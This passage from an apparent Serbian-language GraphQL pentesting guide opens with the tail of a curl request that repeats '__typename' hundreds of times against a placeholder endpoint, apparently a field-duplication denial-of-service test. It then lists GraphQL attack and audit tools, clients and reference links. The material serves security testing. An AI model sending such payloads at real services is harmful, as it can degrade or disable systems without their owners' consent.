\n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Alati

### Skeneri ranjivosti

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testira uobičajene greške u konfiguraciji graphql krajnjih tačaka
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skripta za bezbednosno audiranje GraphQL-a sa fokusom na izvođenje serijskih GraphQL upita i mutacija.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Prepoznaje korišćeni graphql
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Alat koji se može koristiti za preuzimanje šema i pretragu osetljivih podataka, testiranje autorizacije, brute force šema i pronalaženje putanja do određenog tipa.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Može se koristiti kao samostalan alat ili [Burp ekstenzija](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Može se koristiti kao CLI klijent takođe za automatizaciju napada
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Alat koji navodi različite načine **dostizanja određenog tipa u GraphQL šemi**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Naslednik samostalnog i CLI moda InQL-a
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp ekstenzija za napredno testiranje GraphQL-a. _**Skener**_ je srž InQL v5.0, gde možete analizirati GraphQL krajnju tačku ili lokalnu datoteku introspekcije šeme. Automatski generiše sve moguće upite i mutacije, organizujući ih u strukturirani prikaz za vašu analizu. _**Napadač**_ komponenta vam omogućava da pokrenete serijske GraphQL napade, što može biti korisno za zaobilaženje loše implementiranih ograničenja brzine.
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Pokušajte da dobijete šemu čak i kada je introspekcija onemogućena koristeći pomoć nekih Graphql baza podataka koje će sugerisati imena mutacija i parametara.

### Klijenti

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI klijent
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Klijent

### Automatski testovi

{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Video koji objašnjava AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Reference

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{{#include ../../banners/hacktricks-training.md}}
